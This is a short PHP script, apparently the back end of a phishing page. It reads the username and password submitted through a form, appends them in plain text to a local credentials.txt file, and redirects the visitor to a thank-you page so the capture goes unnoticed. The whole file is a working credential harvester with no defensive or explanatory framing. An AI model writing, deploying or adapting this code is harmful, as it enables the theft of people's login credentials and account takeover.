<?php
$username=$_POST['username'];
$password=$_POST['password'];
$file="./credentials.txt";
$write = "Username: $username Password: $password ";

file_put_contents($file,$write,FILE_APPEND);
header('Location: thank_you.html');
exit;

?>
